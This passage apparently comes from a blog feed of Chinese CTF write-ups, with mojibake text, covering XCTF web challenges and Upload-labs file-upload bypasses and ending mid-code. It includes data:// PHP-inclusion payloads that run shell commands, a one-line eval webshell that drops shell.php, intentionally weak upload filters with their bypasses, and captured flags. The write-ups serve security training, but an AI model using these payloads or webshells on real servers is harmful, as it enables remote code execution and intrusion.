¹ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨robots.txtï¼Œå¦‚æžœå­˜åœ¨ï¼Œæœç´¢æœºå™¨äººå°±ä¼šæŒ‰ç…§è¯¥æ–‡ä»¶ä¸­çš„å†…å®¹æ¥ç¡®å®šè®¿é—®çš„èŒƒå›´ï¼›å¦‚æžœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œæ‰€æœ‰çš„æœç´¢èœ˜è››å°†èƒ½å¤Ÿè®¿é—®ç½‘ç«™ä¸Šæ‰€æœ‰æ²¡æœ‰è¢«å£ä»¤ä¿æŠ¤çš„é¡µé¢ã€‚ç™¾åº¦å®˜æ–¹å»ºè®®ï¼Œä»…å½“æ‚¨çš„ç½‘ç«™åŒ…å«ä¸å¸Œæœ›è¢«æœç´¢å¼•æ“Žæ”¶å½•çš„å†…å®¹æ—¶ï¼Œæ‰éœ€è¦ä½¿ç”¨robots.txtæ–‡ä»¶ã€‚å¦‚æžœæ‚¨å¸Œæœ›æœç´¢å¼•æ“Žæ”¶å½•ç½‘ç«™ä¸Šæ‰€æœ‰å†…å®¹ï¼Œè¯·å‹¿å»ºç«‹robots.txtæ–‡ä»¶ã€‚</p><p>å¦‚æžœå°†ç½‘ç«™è§†ä¸ºé…’åº—é‡Œçš„ä¸€ä¸ªæˆ¿é—´ï¼Œrobots.txtå°±æ˜¯ä¸»äººåœ¨æˆ¿é—´é—¨å£æ‚¬æŒ‚çš„â€œè¯·å‹¿æ‰“æ‰°â€æˆ–â€œæ¬¢è¿Žæ‰“æ‰«â€çš„æç¤ºç‰Œã€‚è¿™ä¸ªæ–‡ä»¶å‘Šè¯‰æ¥è®¿çš„æœç´¢å¼•æ“Žå“ªäº›æˆ¿é—´å¯ä»¥è¿›å…¥å’Œå‚è§‚ï¼Œå“ªäº›æˆ¿é—´å› ä¸ºå­˜æ”¾è´µé‡ç‰©å“ï¼Œæˆ–å¯èƒ½æ¶‰åŠä½æˆ·åŠè®¿å®¢çš„éšç§è€Œä¸å¯¹æœç´¢å¼•æ“Žå¼€æ”¾ã€‚ä½†robots.txtä¸æ˜¯å‘½ä»¤ï¼Œä¹Ÿä¸æ˜¯é˜²ç«å¢™ï¼Œå¦‚åŒå®ˆé—¨äººæ— æ³•é˜»æ­¢çªƒè´¼ç­‰æ¶æ„é—¯å…¥è€…ã€‚â€”æ¥æºç™¾åº¦ç™¾ç§‘</p><p>è®¿é—®/robots.txt</p><p><img src="/2021/07/16/xctf-web-training-www-robots/blog/source_posts\XCTFï¼šweb-training-WWW-Robots\robots.txt.png" alt="robots.txt"></p><p>è®¿é—®/fl0g.php</p><p><img src="/2021/07/16/xctf-web-training-www-robots/blog/source_posts\XCTFï¼šweb-training-WWW-Robots\flag.png" alt="flag"></p><p>å¾—åˆ°</p><pre><code>cyberpeace{a1dd06c3c6f1b6c5d72b13e5b95cf77a}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:Web-PHP2</title>
      <link href="2021/07/16/xctf-web-php2/"/>
      <url>2021/07/16/xctf-web-php2/</url>
      
        <content type="html"><![CDATA[<p>è®¿é—®index.phpsçœ‹åˆ°</p><pre><code>not allowed!"); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == "admin") { echo "Access granted!"; echo "Key: xxxxxxx"; } ?&gt; Can you anthenticate to this website? </code></pre><h4 id="é‡ç‚¹å°±åœ¨äºŽ-GET-id-urldecode-GET-id"><a href="#é‡ç‚¹å°±åœ¨äºŽ-GET-id-urldecode-GET-id" class="headerlink" title="é‡ç‚¹å°±åœ¨äºŽ $_GET[id] = urldecode($_GET[id])"></a>é‡ç‚¹å°±åœ¨äºŽ $_GET[id] = urldecode($_GET[id])</h4><p>å¯¹adminè¿›è¡Œç¼–ç </p><pre><code>61%64%6D%69%6E%</code></pre><p><img src="/2021/07/16/xctf-web-php2/blog/source_posts\XCTFï¼šWeb-PHP2\ä¸€æ¬¡URLç¼–ç .png" alt="ä¸€æ¬¡URLç¼–ç "></p><p>ç»“æžœæ²¡æœ‰ååº”åº”è¯¥æ˜¯ç½‘ç«™åˆå¯¹æ­¤è¿›è¡Œäº†ä¸€æ¬¡ç¼–ç </p><p>æ‰€ä»¥é‡‡ç”¨</p><pre><code>%2561%2564%256D%2569%256E</code></pre><p><img src="/2021/07/16/xctf-web-php2/blog/source_posts\XCTFï¼šWeb-PHP2\äºŒæ¬¡URLç¼–ç .png" alt="äºŒæ¬¡URLç¼–ç "></p><pre><code>cyberpeace{7e95a5de28fcf89ce12721f28199e7f3}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:Web-php_include</title>
      <link href="2021/07/16/xctf-web-php-include/"/>
      <url>2021/07/16/xctf-web-php-include/</url>
      
        <content type="html"><![CDATA[<p>æºç </p><pre><code>&lt;?phpshow_source(__FILE__);echo $_GET['hello'];$page=$_GET['page'];while (strstr($page, "php://")) {    $page=str_replace("php://", "", $page);  //  å°†â€œphp://â€æ›¿æ¢æˆç©ºå¯ä»¥é‡‡ç”¨å¤§å†™åŒå†™ç­‰ç»•è¿‡}include($page);?&gt;</code></pre><h4 id="æ³•ä¸€"><a href="#æ³•ä¸€" class="headerlink" title="æ³•ä¸€"></a>æ³•ä¸€</h4><p><img src="/2021/07/16/xctf-web-php-include/blog/source_posts\XCTFï¼šWeb-php-include\ece5d3f5afef9925e795f126f3a6a87.png" alt="ece5d3f5afef9925e795f126f3a6a87"></p><p>ç»“æžœ</p><p><img src="/2021/07/16/xctf-web-php-include/blog/source_posts\XCTFï¼šWeb-php-include\20200525082546375.png" alt="20200525082546375"></p><p>ç„¶åŽ</p><p><img src="/2021/07/16/xctf-web-php-include/blog/source_posts\XCTFï¼šWeb-php-include\20200525082600649.png" alt="20200525082600649"></p><p>æŸ¥çœ‹æºç </p><p><img src="/2021/07/16/xctf-web-php-include/blog/source_posts\XCTFï¼šWeb-php-include\20200525082612785.png" alt="20200525082612785"></p><h4 id="æ³•äºŒ"><a href="#æ³•äºŒ" class="headerlink" title="æ³•äºŒ"></a>æ³•äºŒ</h4><p>æ—¢ç„¶è¿‡æ»¤äº†php://çš„ä¼ªåè®® æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶ä»–åè®®æ¥åšè¿™é‡Œä½¿ç”¨data://ä¼ªåè®®</p><h5 id="data-ä¼ªåè®®"><a href="#data-ä¼ªåè®®" class="headerlink" title="data://ä¼ªåè®®"></a>data://ä¼ªåè®®</h5><p>php5.2.0èµ·ï¼Œæ•°æ®æµå°è£…å™¨å¼€å§‹æœ‰æ•ˆï¼Œä¸»è¦ç”¨äºŽæ•°æ®æµçš„è¯»å–ã€‚å¦‚æžœä¼ å…¥çš„æ•°æ®æ˜¯PHPä»£ç ï¼Œå°±ä¼šæ‰§è¡Œä»£ç </p><p>ä½¿ç”¨æ–¹æ³•:data://text/plain;base64,xxxx(base64ç¼–ç åŽçš„æ•°æ®)</p><!--?php system("dir")?--><p> base64ç¼–ç åŽä½¿ç”¨</p><pre><code>http://111.198.29.45:47062/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJkaXIisssKT8%2b </code></pre><p>(æ³¨æ„ç¼–ç åŽçš„+å·è¦URLç¼–ç )</p><!--?php system("cat fl4gisisish3r3.php")?--><p> base64ç¼–ç åŽä½¿ç”¨</p><pre><code>http://111.198.29.45:47062/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==</code></pre><h4 id="æ³•ä¸‰"><a href="#æ³•ä¸‰" class="headerlink" title="æ³•ä¸‰"></a>æ³•ä¸‰</h4><pre><code>http://111.200.241.244:36906/?page=data://text/plain/;base64,Jmx0Oz9waHAgZXZhbCgkX1BPU1RbSDNuZ10pOyA/Jmd0Ow==</code></pre><p>è¿™é‡Œé‡‡ç”¨base64åŠ å¯†æœ¨é©¬</p><p>èšå‰‘è¿žæŽ¥</p><h4 id="æ³•å››"><a href="#æ³•å››" class="headerlink" title="æ³•å››"></a>æ³•å››</h4><p>å¾¡å‰‘æ‰«æä¸å¤šèµ˜è¿°</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:web-baby_web</title>
      <link href="2021/07/16/xctf-web-baby-web/"/>
      <url>2021/07/16/xctf-web-baby-web/</url>
      
        <content type="html"><![CDATA[<p>é¢˜ç›®æè¿°</p><pre><code>æƒ³æƒ³åˆå§‹é¡µé¢æ˜¯å“ªä¸ª</code></pre><p>æ‰€ä»¥è®¿é—®</p><pre><code>111.200.241.244:30590/index.php</code></pre><p>æŠ“åŒ…ï¼Œsend to repeater</p><p><img src="/2021/07/16/xctf-web-baby-web/blog/source_posts\XCTFï¼šweb-baby-web\reponse.png" alt="reponse"></p><p>åœ¨å“åº”é‡Œçœ‹åˆ°flag</p><pre><code>flag{very_baby_web}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>URLï¼šç¼–ç è¡¨</title>
      <link href="2021/07/16/url-bian-ma-biao/"/>
      <url>2021/07/16/url-bian-ma-biao/</url>
      
        <content type="html"><![CDATA[<h2 id="URLç¼–ç è¡¨"><a href="#URLç¼–ç è¡¨" class="headerlink" title="URLç¼–ç è¡¨"></a>URLç¼–ç è¡¨</h2><table><thead><tr><th>backspace</th><th>8%</th><th>A</th><th>41%</th><th>a</th><th>61%</th><th>Â§</th><th>%A7</th><th>Ã•</th><th>%D5</th><th></th></tr></thead><tbody><tr><td>tab</td><td>9%</td><td>B</td><td>42%</td><td>b</td><td>62%</td><td>Â«</td><td>%AB</td><td>Ã–</td><td>%D6</td><td></td></tr><tr><td>linefeed</td><td>%0A</td><td>C</td><td>43%</td><td>c</td><td>63%</td><td>Â¬</td><td>%AC</td><td>Ã˜</td><td>%D8</td><td></td></tr><tr><td>creturn</td><td>%0D</td><td>D</td><td>44%</td><td>d</td><td>64%</td><td>Â¯</td><td>%AD</td><td>Ã™</td><td>%D9</td><td></td></tr><tr><td>space</td><td>20%</td><td>E</td><td>45%</td><td>e</td><td>65%</td><td>Âº</td><td>%B0</td><td>Ãš</td><td>%DA</td><td></td></tr><tr><td>!</td><td>21%</td><td>F</td><td>46%</td><td>f</td><td>66%</td><td>Â±</td><td>%B1</td><td>Ã›</td><td>%DB</td><td></td></tr><tr><td>â€œ</td><td>22%</td><td>G</td><td>47%</td><td>g</td><td>67%</td><td>Âª</td><td>%B2</td><td>Ãœ</td><td>%DC</td><td></td></tr><tr><td>#</td><td>23%</td><td>H</td><td>48%</td><td>h</td><td>68%</td><td>,</td><td>%B4</td><td>Ã</td><td>%DD</td><td></td></tr><tr><td>$</td><td>24%</td><td>I</td><td>49%</td><td>i</td><td>69%</td><td>Âµ</td><td>%B5</td><td>Ãž</td><td>%DE</td><td></td></tr><tr><td>%</td><td>25%</td><td>J</td><td>%4A</td><td>j</td><td>%6A</td><td>Â»</td><td>%BB</td><td>ÃŸ</td><td>%DF</td><td></td></tr><tr><td>&amp;</td><td>26%</td><td>K</td><td>%4B</td><td>k</td><td>%6B</td><td>Â¼</td><td>%BC</td><td>Ã </td><td>%E0</td><td></td></tr><tr><td>â€˜</td><td>27%</td><td>L</td><td>%4C</td><td>l</td><td>%6C</td><td>Â½</td><td>%BD</td><td>Ã¡</td><td>%E1</td><td></td></tr><tr><td>(</td><td>28%</td><td>M</td><td>%4D</td><td>m</td><td>%6D</td><td>Â¿</td><td>%BF</td><td>Ã¢</td><td>%E2</td><td></td></tr><tr><td>)</td><td>29%</td><td>N</td><td>%4E</td><td>n</td><td>%6E</td><td>Ã€</td><td>%C0</td><td>Ã£</td><td>%E3</td><td></td></tr><tr><td>*</td><td>%2A</td><td>O</td><td>%4F</td><td>o</td><td>%6F</td><td>Ã</td><td>%C1</td><td>Ã¤</td><td>%E4</td><td></td></tr><tr><td>+</td><td>%2B</td><td>P</td><td>50%</td><td>p</td><td>70%</td><td>Ã‚</td><td>%C2</td><td>Ã¥</td><td>%E5</td><td></td></tr><tr><td>,</td><td>%2C</td><td>Q</td><td>51%</td><td>q</td><td>71%</td><td>Ãƒ</td><td>%C3</td><td>Ã¦</td><td>%E6</td><td></td></tr><tr><td>-</td><td>%2D</td><td>R</td><td>52%</td><td>r</td><td>72%</td><td>Ã„</td><td>%C4</td><td>Ã§</td><td>%E7</td><td></td></tr><tr><td>.</td><td>%2E</td><td>S</td><td>53%</td><td>s</td><td>73%</td><td>Ã…</td><td>%C5</td><td>Ã¨</td><td>%E8</td><td></td></tr><tr><td>/</td><td>%2F</td><td>T</td><td>54%</td><td>t</td><td>74%</td><td>Ã†</td><td>%C6</td><td>Ã©</td><td>%E9</td><td></td></tr><tr><td>0</td><td>30%</td><td>U</td><td>55%</td><td>u</td><td>75%</td><td>Ã‡</td><td>%C7</td><td>Ãª</td><td>%EA</td><td></td></tr><tr><td>1</td><td>31%</td><td>V</td><td>56%</td><td>v</td><td>76%</td><td>Ãˆ</td><td>%C8</td><td>Ã«</td><td>%EB</td><td></td></tr><tr><td>2</td><td>32%</td><td>W</td><td>57%</td><td>w</td><td>77%</td><td>Ã‰</td><td>%C9</td><td>Ã¬</td><td>%EC</td><td></td></tr><tr><td>3</td><td>33%</td><td>X</td><td>58%</td><td>x</td><td>78%</td><td>ÃŠ</td><td>%CA</td><td>Ã­</td><td>%ED</td><td></td></tr><tr><td>4</td><td>34%</td><td>Y</td><td>59%</td><td>y</td><td>79%</td><td>Ã‹</td><td>%CB</td><td>Ã®</td><td>%EE</td><td></td></tr><tr><td>5</td><td>35%</td><td>Z</td><td>%5A</td><td>z</td><td>%7A</td><td>ÃŒ</td><td>%CC</td><td>Ã¯</td><td>%EF</td><td></td></tr><tr><td>6</td><td>36%</td><td></td><td></td><td></td><td></td><td></td><td></td><td>Ã°</td><td>%F0</td><td></td></tr><tr><td>7</td><td>37%</td><td>?</td><td>%3F</td><td>{</td><td>%7B</td><td>Ã</td><td>%CD</td><td>Ã±</td><td>%F1</td><td></td></tr><tr><td>8</td><td>38%</td><td>@</td><td>40%</td><td>|</td><td>%7C</td><td>ÃŽ</td><td>%CE</td><td>Ã²</td><td>%F2</td><td></td></tr><tr><td>9</td><td>39%</td><td>[</td><td>%5B</td><td>}</td><td>%7D</td><td>Ã</td><td>%CF</td><td>Ã³</td><td>%F3</td><td></td></tr><tr><td>:</td><td>%3A</td><td>\</td><td>%5C</td><td>~</td><td>%7E</td><td>Ã</td><td>%D0</td><td>Ã´</td><td>%F4</td><td></td></tr><tr><td>;</td><td>%3B</td><td>]</td><td>%5D</td><td>Â¢</td><td>%A2</td><td>Ã‘</td><td>%D1</td><td>Ãµ</td><td>%F5</td><td></td></tr><tr><td>&lt;</td><td>%3C</td><td>^</td><td>%5E</td><td>Â£</td><td>%A3</td><td>Ã’</td><td>%D2</td><td>Ã¶</td><td>%F6</td><td></td></tr><tr><td>=</td><td>%3D</td><td>_</td><td>%5F</td><td>Â¥</td><td>%A5</td><td>Ã“</td><td>%D3</td><td>Ã·</td><td>%F7</td><td></td></tr><tr><td>&gt;</td><td>%3E</td><td>`</td><td>60%</td><td>|</td><td>%A6</td><td>Ã”</td><td>%D4</td><td>Ã¸</td><td>%F8</td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>Ã¹</td><td>%F9</td><td></td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Uploadlabs</title>
      <link href="2021/07/16/uploadlabs/"/>
      <url>2021/07/16/uploadlabs/</url>
      
        <content type="html"><![CDATA[<h2 id="Pass-1-jsæ£€æŸ¥"><a href="#Pass-1-jsæ£€æŸ¥" class="headerlink" title="Pass-1 jsæ£€æŸ¥"></a>Pass-1 jsæ£€æŸ¥</h2><pre><code>function checkFile() {    var file = document.getElementsByName('upload_file')[0].value;    if (file == null || file == "") {        alert("è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!");        return false;    }    //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»åž‹    var allow_ext = ".jpg|.png|.gif";    //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»åž‹    var ext_name = file.substring(file.lastIndexOf("."));    //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»åž‹æ˜¯å¦å…è®¸ä¸Šä¼     if (allow_ext.indexOf(ext_name + "|") == -1) {        var errMsg = "è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ " + allow_ext + "ç±»åž‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»åž‹ä¸ºï¼š" + ext_name;        alert(errMsg);        return false;    }}</code></pre><h4 id="æ³•ä¸€"><a href="#æ³•ä¸€" class="headerlink" title="æ³•ä¸€"></a>æ³•ä¸€</h4><p>å°è¯•å‰ç«¯ç»•è¿‡ï¼Œåœ¨å‰ç«¯jsåˆ¤æ–­å‡½æ•°ä¸­åŠ ä¸Šå¯ä»¥ä¸Šä¼ phpæ–‡ä»¶,ä¿®æ”¹ä¸ºï¼š</p><pre class=" language-.php"><code class="language-.php">var allow_ext = ".jpg|.png|.gif|.php";</code></pre><p>ç„¶åŽè®¿é—®</p><pre><code>127.0.0.1/upload-labs/upload/1.php</code></pre><h4 id="æ³•äºŒ"><a href="#æ³•äºŒ" class="headerlink" title="æ³•äºŒ"></a>æ³•äºŒ</h4><p>æˆ–è€…ç”¨burpæŠ“åŒ…ä¿®æ”¹æ–‡ä»¶ç±»åž‹ï¼ˆä¸Šä¼ 1.jpgä¿®æ”¹ä¸º1.phpï¼‰</p><p>çŽ°åœ¨æ–‡ä»¶å¤¹ä¸­ç¼–å†™phpæ–‡ä»¶æ”¹æˆjpgæ ¼å¼</p><pre><code>&lt;?php@eval($_post[a]);echo 'flag';fputs(fopen('shell.php','w'),'&lt;?php @eval($_post[a]);?&gt;');?&gt;</code></pre><p>ç„¶åŽåœ¨burpä¸­å§jpgæ”¹æˆphp</p><h2 id="Pass-2-åªéªŒè¯Content-type"><a href="#Pass-2-åªéªŒè¯Content-type" class="headerlink" title="Pass-2 åªéªŒè¯Content-type"></a>Pass-2 åªéªŒè¯Content-type</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists($UPLOAD_ADDR)) {        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {                $img_path = $UPLOAD_ADDR . $_FILES['upload_file']['name'];                $is_upload = true;            }        } else {            $msg = 'æ–‡ä»¶ç±»åž‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼';        }    } else {        $msg = $UPLOAD_ADDR.'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';    }}</code></pre><p>ä»…ä»…åˆ¤æ–­content-typeç±»åž‹ï¼Œå› æ­¤ä¸Šä¼ 1.phpæŠ“åŒ…ä¿®æ”¹content-typeä¸ºå›¾ç‰‡ç±»åž‹ï¼šimage/jpegã€image/pngã€image/gif</p><h2 id="Pass-3-é»‘åå•ç»•è¿‡"><a href="#Pass-3-é»‘åå•ç»•è¿‡" class="headerlink" title="Pass-3 é»‘åå•ç»•è¿‡"></a>Pass-3 é»‘åå•ç»•è¿‡</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists($UPLOAD_ADDR)) {        $deny_ext = array('.asp','.aspx','.php','.jsp');        $file_name = trim($_FILES['upload_file']['name']);        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹        $file_ext = strrchr($file_name, '.');        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™        $file_ext = str_ireplace('::$DATA', '', $file_ext);//åŽ»é™¤å­—ç¬¦ä¸²::$DATA        $file_ext = trim($file_ext); //æ”¶å°¾åŽ»ç©º        if(!in_array($file_ext, $deny_ext)) {            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR. '/' . $_FILES['upload_file']['name'])) {                 $img_path = $UPLOAD_ADDR .'/'. $_FILES['upload_file']['name'];                 $is_upload = true;            }        } else {            $msg = 'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåŽç¼€æ–‡ä»¶ï¼';        }    } else {        $msg = $UPLOAD_ADDR . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';    }}</code></pre><p>ç”¨é»‘åå•ä¸å…è®¸ä¸Šä¼ <code>.asp,.aspx,.php,.jsp</code>åŽç¼€çš„æ–‡ä»¶<br> ä½†å¯ä»¥ä¸Šä¼ <code>.phtml .phps .php5 .pht</code><br> å‰ææ˜¯apacheçš„httpd.confä¸­æœ‰å¦‚ä¸‹é…ç½®ä»£ç </p><pre><code>AddType application/x-httpd-php .php .phtml .phps .php5 .pht</code></pre><p>å› æ­¤æŠ“åŒ…ä¿®æ”¹ä¸º1.php5ä¸Šä¼ ï¼Œå›žå¤åŒ…é‡Œæœ‰ä¸Šä¼ è·¯å¾„</p><h2 id="Pass-4-htaccessç»•è¿‡"><a href="#Pass-4-htaccessç»•è¿‡" class="headerlink" title="Pass-4 .htaccessç»•è¿‡"></a>Pass-4 .htaccessç»•è¿‡</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists($UPLOAD_ADDR)) {        $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");        $file_name = trim($_FILES['upload_file']['name']);        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹        $file_ext = strrchr($file_name, '.');        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™        $file_ext = str_ireplace('::$DATA', '', $file_ext);//åŽ»é™¤å­—ç¬¦ä¸²::$DATA        $file_ext = trim($file_ext); //æ”¶å°¾åŽ»ç©º        if (!in_array($file_ext, $deny_ext)) {            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {                $img_path = $UPLOAD_ADDR . $_FILES['upload_file']['name'];                $is_upload = true;            }        } else {            $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !';        }    } else {        $msg = $UPLOAD_ADDR . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';    }}</code></pre><p> ç»•è¿‡æ–¹æ³•</p><p>ä¸Šä¼ .htaccessæ–‡ä»¶ï¼ˆ<em>æ³¨: .htaccessæ–‡ä»¶ç”Ÿæ•ˆå‰ææ¡ä»¶ä¸º1.mod_rewriteæ¨¡å—å¼€å¯ã€‚2.AllowOverride All</em>ï¼‰</p><h4 id="htaccessæ–‡ä»¶"><a href="#htaccessæ–‡ä»¶" class="headerlink" title=".htaccessæ–‡ä»¶"></a>.htaccessæ–‡ä»¶</h4><p>.htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å®žçŽ°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½IISå¹³å°ä¸Šä¸å­˜åœ¨è¯¥æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶é»˜è®¤å¼€å¯ï¼Œå¯ç”¨å’Œå…³é—­åœ¨httpd.confæ–‡ä»¶ä¸­é…ç½®ã€‚</p><p>æ–‡ä»¶å†…å®¹ä¸ºAddType application/x-httpd-php .jpgä½¿jpgæ–‡ä»¶ç”¨è§£æžæˆphp</p><h2 id="Pass-5-å¤§å°å†™ç»•è¿‡"><a href="#Pass-5-å¤§å°å†™ç»•è¿‡" class="headerlink" title="Pass-5 å¤§å°å†™ç»•è¿‡"></a>Pass-5 å¤§å°å†™ç»•è¿‡</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists($UPLOAD_ADDR)) {        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");        $file_name = trim($_FILES['upload_file']['name']);        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹        $file_ext = strrchr($file_name, '.');        $file_ext = str_ireplace('::$DATA', '', $file_ext);//åŽ»é™¤å­—ç¬¦ä¸²::$DATA        $file_ext = trim($file_ext); //é¦–å°¾åŽ»ç©º        if (!in_array($file_ext, $deny_ext)) {            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {                $img_path = $UPLOAD_ADDR . '/' . $file_name;                $is_upload = true;            }        } else {            $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ';        }    } else {        $msg = $UPLOAD_ADDR . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';    }}</code></pre><p>ç›¸æ¯”äºŽpass-4ï¼Œè¿‡æ»¤äº†.htaccessï¼Œä½†å°†åŽç¼€è½¬æ¢ä¸ºå°å†™åŽ»æŽ‰äº†ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨å¤§å°ç»•è¿‡</p><p>æ”¹æˆ1.PHP</p><h2 id="Pass-6-ç©ºæ ¼ç»•è¿‡"><a href="#Pass-6-ç©ºæ ¼ç»•è¿‡" class="headerlink" title="Pass-6 ç©ºæ ¼ç»•è¿‡"></a>Pass-6 ç©ºæ ¼ç»•è¿‡</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists($UPLOAD_ADDR)) {        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");        $file_name = trim($_FILES['upload_file']['name']);        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹        $file_ext = strrchr($file_name, '.');        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™        $file_ext = str_ireplace('::$DATA', '', $file_ext);//åŽ»é™¤å­—ç¬¦ä¸²::$DATA        if (!in_array($file_ext, $deny_ext)) {            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {                $img_path = $UPLOAD_ADDR . '/' . $file_name;                $is_upload = true;            }        } else {            $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ';        }    } else {        $msg = $UPLOAD_ADDR . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';    }}</code></pre><p>è¿™é¢˜æ²¡æœ‰å¯¹åŽç¼€åè¿›è¡ŒåŽ»ç©ºï¼Œå› æ­¤å¯ä»¥åœ¨åŽç¼€ååŠ ç©ºæ ¼ç»•è¿‡</p><h2 id="Pass-7-ç‚¹ç»•è¿‡"><a href="#Pass-7-ç‚¹ç»•è¿‡" class="headerlink" title="Pass-7 ç‚¹ç»•è¿‡"></a>Pass-7 ç‚¹ç»•è¿‡</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists($UPLOAD_ADDR)) {        $deny_ext = 